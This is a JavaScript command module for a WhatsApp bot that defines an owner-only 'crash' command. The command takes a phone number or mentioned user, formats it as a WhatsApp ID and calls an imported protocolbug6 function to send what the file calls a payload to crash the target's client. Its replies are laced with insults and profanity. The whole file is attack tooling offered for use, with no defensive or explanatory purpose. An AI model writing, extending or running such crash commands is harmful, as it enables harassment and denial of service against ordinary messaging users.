const { protocolbug6 } = require('function-main');
const ownerMiddleware = require('../../utility/botUtil/Ownermiddleware');

module.exports = {
  name: 'crash',
  aliases: [],
  description: 'Sends a payload to crash a WhatsApp client (owner only)',
  run: async (context) => {
    await ownerMiddleware(context, async () => {
      const { client, m, prefix, text, botname } = context;

      try {
        // Check for target (phone number, quoted user, or mentioned JID)
        let target = text.split(' ')[0] || m.quoted?.sender || m.mentionedJid?.[0];
        if (!target) {
          return client.sendMessage(m.chat, {
            text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, dumbass, give me a target! Use ${prefix}crash <number> or mention someone, moron.\n\nPowered by *${botname}*`
          }, { quoted: m });
        }
        // Convert to JID format if needed (e.g., 123456789 → 123456789@s.whatsapp.net)
        if (!target.includes('@s.whatsapp.net')) {
          target = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
        }

        // Execute protocolbug6 with mention enabled
        await protocolbug6(client, target, true);

        // Send response
        await client.sendMessage(m.chat, {
          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ 💥 Payload dropped on ${target}! Shit’s about to hit the fan, bitches!\n\nPowered by *${botname}*`
        }, { quoted: m });

      } catch (error) {
        console.error(`Error sending crash payload to ${target}:`, error.message, error.stack);
        await client.sendMessage(m.chat, {
          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, something fucked up the crash payload. Try again, you slacker.\n\nPowered by *${botname}*`
        }, { quoted: m });
      }
    });
  },
};